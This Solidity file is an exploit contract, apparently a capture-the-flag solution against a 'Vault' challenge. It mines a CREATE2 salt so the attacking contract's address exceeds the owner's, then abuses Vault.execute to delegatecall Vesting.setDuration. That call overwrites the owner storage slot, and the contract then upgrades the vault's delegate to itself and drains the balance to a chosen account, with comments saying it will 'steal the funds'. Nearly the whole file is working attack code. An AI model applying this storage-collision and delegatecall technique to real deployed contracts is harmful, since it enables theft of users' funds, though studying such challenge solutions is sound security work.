// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Vault.sol";
import "./Vesting.sol";

contract VaultHackCreator {
    function deploy(address instance, address account, uint256 salt) external {
        // we use create2 here in order to make the hack contract address greater than the current
        // owner of the vault
        address owner = Vault(payable(instance)).owner();
        HackVault hack = new HackVault{salt: bytes32(salt)}(instance, account);
        require(uint160(address(hack)) > uint160(owner), "hack is lower than owner");
        hack.hack();
    }
}

contract HackVault {
    address instance;
    address account;

    constructor(address _instance, address _account) {
        instance = _instance;
        account = _account;
    }

    function hack() external {
        Vault vault = Vault(payable(instance));

        // First step: delegatecall Vesting.setDuration through Vault.execute to overwrite the owner
        uint256 duration = uint256(uint160(address(this)));
        bytes memory durationData = abi.encodeWithSelector(Vesting.setDuration.selector, duration);
        vault.execute(instance, durationData);

        // Second step: we are owners of the vault, upgrade the vault delegate to this contract
        // so we can call withdraw
        vault.upgradeDelegate(address(this));

        // Last step: call withdraw using delegatecall to steal the funds
        bytes memory withdrawData = abi.encodeWithSelector(HackVault.withdraw.selector, account);
        vault.execute(instance, withdrawData);
    }

    function withdraw(address payable receiver) external {
        receiver.transfer(address(this).balance);
    }
}
